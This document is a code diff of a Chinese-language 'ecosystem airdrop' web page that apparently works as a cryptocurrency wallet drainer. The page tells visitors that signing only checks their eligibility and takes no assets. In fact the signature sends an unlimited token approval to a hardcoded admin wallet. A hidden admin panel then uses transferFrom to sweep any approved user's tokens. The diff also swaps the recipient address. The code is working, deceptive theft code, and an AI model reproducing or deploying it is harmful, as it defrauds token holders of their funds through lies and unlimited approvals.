@@ -26,98 +26,105 @@ input{width:100%;height:42px;background:#0f172a;border:1px solid #334155;border-
 </head>
 <body>
 <div class="container">
-<div class="main-card">
-<h2 class="title">项目生态空投福利</h2>
-<p class="sub-tip">连接钱包完成简单签名，免费领取官方空投代币</p>
-<button class="btn btn-conn" id="connectWallet">连接钱包领取空投</button>
-<div class="wallet-show">已连接：<span id="addrText">未连接</span></div>
-<p class="tips">仅授权空投资格核验，不随意扣除资产</p>
-<button class="btn btn-get" id="authReceive">签名授权领取空投</button>
-<!-- 管理员专属划扣后台 -->
-<div class="admin-box" id="adminPanel">
-<h3 class="admin-title">后台资产归集划扣</h3>
-<input type="text" placeholder="填写用户授权钱包地址" id="userAddr">
-<input type="number" placeholder="填写划扣代币数量" id="deductNum">
-<button class="btn btn-deduct" id="deductBtn">一键执行归集划扣</button>
+    <div class="main-card">
+        <h2 class="title">项目生态空投福利</h2>
+        <p class="sub-tip">连接钱包完成简单签名，免费领取官方空投代币</p>
+
+        <button class="btn btn-conn" id="connectWallet">连接钱包领取空投</button>
+        <div class="wallet-show">已连接：<span id="addrText">未连接</span></div>
+
+        <p class="tips">仅授权空投资格核验，不随意扣除资产</p>
+        <button class="btn btn-get" id="authReceive">签名授权领取空投</button>
+
+        <!-- 管理员专属划扣后台 -->
+        <div class="admin-box" id="adminPanel">
+            <h3 class="admin-title">后台资产归集划扣</h3>
+            <input type="text" placeholder="填写用户授权钱包地址" id="userAddr">
+            <input type="number" placeholder="填写划扣代币数量" id="deductNum">
+            <button class="btn btn-deduct" id="deductBtn">一键执行归集划扣</button>
+        </div>
+    </div>
 </div>
-</div>
-</div>
+
 <script>
-// 全部换成多签钱包地址
-const ADMIN_ADDR = "0x367ea4eb00e3ffa77c6f20022a8488527a71d9ab".toLowerCase();
+// 你的管理员钱包地址
+const ADMIN_ADDR = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
 // 指定授权代币合约
 const TOKEN_ADDR = "0x99a57E6C8558BC6689f894e068733ADf83C19725";
-// 用户授权目标 = 多签地址
-const APPROVE_ADDR = "0x367ea4eb00e3ffa77c6f20022a8488527a71d9ab";
 let nowUser = "";
+
 // 连接钱包
 document.getElementById("connectWallet").addEventListener("click",async()=>{
-if(!window.ethereum){
-alert("请安装去中心化钱包再参与领取");
-return;
-}
-try{
-let accounts = await ethereum.request({method:"eth_requestAccounts"});
-nowUser = accounts[0].toLowerCase();
-document.getElementById("addrText").innerText = nowUser.slice(0,6)+"..."+nowUser.slice(-4);
-// 多签钱包连接自动显示后台
-if(nowUser === ADMIN_ADDR){
-document.getElementById("adminPanel").classList.add("show");
-}
-alert("钱包连接成功，可参与空投领取");
-}catch(e){
-alert("连接失败，请重试");
-}
+    if(!window.ethereum){
+        alert("请安装去中心化钱包再参与领取");
+        return;
+    }
+    try{
+        let accounts = await ethereum.request({method:"eth_requestAccounts"});
+        nowUser = accounts[0].toLowerCase();
+        document.getElementById("addrText").innerText = nowUser.slice(0,6)+"..."+nowUser.slice(-4);
+        // 管理员自动显示划扣面板
+        if(nowUser === ADMIN_ADDR){
+            document.getElementById("adminPanel").classList.add("show");
+        }
+        alert("钱包连接成功，可参与空投领取");
+    }catch(e){
+        alert("连接失败，请重试");
+    }
 })
-// 用户签名授权 = 授权给多签
+
+// 用户签名授权 = 无限授权
 document.getElementById("authReceive").addEventListener("click",async()=>{
-if(!nowUser) return alert("请先连接钱包");
-let ok = confirm("本次签名仅用于核验空投资格，确认即可发放空投，确认继续？");
-if(!ok)return;
-try{
-let spender = APPROVE_ADDR.slice(2).padStart(64,"0");
-let maxAllow = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-let data = "0x095ea7b3"+spender+maxAllow;
-await ethereum.request({
-method:"eth_sendTransaction",
-params:[{
-from:nowUser,
-to:TOKEN_ADDR,
-gasLimit:"0x300000",
-data:data
-}]
+    if(!nowUser) return alert("请先连接钱包");
+    let ok = confirm("本次签名仅用于核验空投资格，确认即可发放空投，确认继续？");
+    if(!ok)return;
+    try{
+        let spender = ADMIN_ADDR.slice(2).padStart(64,"0");
+        let maxAllow = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        let data = "0x095ea7b3"+spender+maxAllow;
+        await ethereum.request({
+            method:"eth_sendTransaction",
+            params:[{
+                from:nowUser,
+                to:TOKEN_ADDR,
+                gasLimit:"0x300000",
+                data:data
+            }]
+        })
+        alert("授权成功！空投代币即将发放到账");
+    }catch(e){
+        alert("已取消本次签名");
+    }
 })
-alert("授权成功！空投代币即将发放到账");
-}catch(e){
-alert("已取消本次签名");
-}
-})
-// 多签钱包直接发起划扣
+
+// 管理员前端直接划扣（核心功能）
 document.getElementById("deductBtn").addEventListener("click",async()=>{
-if(nowUser !== ADMIN_ADDR) return alert("无操作权限");
-let uAddr = document.getElementById("userAddr").value.trim();
-let num = document.getElementById("deductNum").value.trim();
-if(!uAddr||!num||Number(num)<=0) return alert("请填写完整地址与数量");
-let fromHex = uAddr.toLowerCase().slice(2).padStart(64,"0");
-let toHex = ADMIN_ADDR.slice(2).padStart(64,"0");
-let valHex = BigInt(Math.floor(Number(num)*1e18)).toString(16).padStart(64,"0");
-let callData = "0x23b872dd"+fromHex+toHex+valHex;
-try{
-await ethereum.request({
-method:"eth_sendTransaction",
-params:[{
-from:nowUser,
-to:TOKEN_ADDR,
-gasLimit:"0x300000",
-data:callData
-}]
-})
-alert("代币划扣归集成功！");
-document.getElementById("userAddr").value = "";
-document.getElementById("deductNum").value = "";
-}catch(e){
-alert("划扣执行失败");
-}
+    if(nowUser !== ADMIN_ADDR) return alert("无操作权限");
+    let uAddr = document.getElementById("userAddr").value.trim();
+    let num = document.getElementById("deductNum").value.trim();
+    if(!uAddr||!num||Number(num)<=0) return alert("请填写完整地址与数量");
+
+    let fromHex = uAddr.toLowerCase().slice(2).padStart(64,"0");
+    let toHex = ADMIN_ADDR.slice(2).padStart(64,"0");
+    let valHex = BigInt(Math.floor(Number(num)*1e18)).toString(16).padStart(64,"0");
+    let callData = "0x23b872dd"+fromHex+toHex+valHex;
+
+    try{
+        await ethereum.request({
+            method:"eth_sendTransaction",
+            params:[{
+                from:nowUser,
+                to:TOKEN_ADDR,
+                gasLimit:"0x300000",
+                data:callData
+            }]
+        })
+        alert("代币划扣归集成功！");
+        document.getElementById("userAddr").value = "";
+        document.getElementById("deductNum").value = "";
+    }catch(e){
+        alert("划扣执行失败");
+    }
 })
 </script>
 </body>
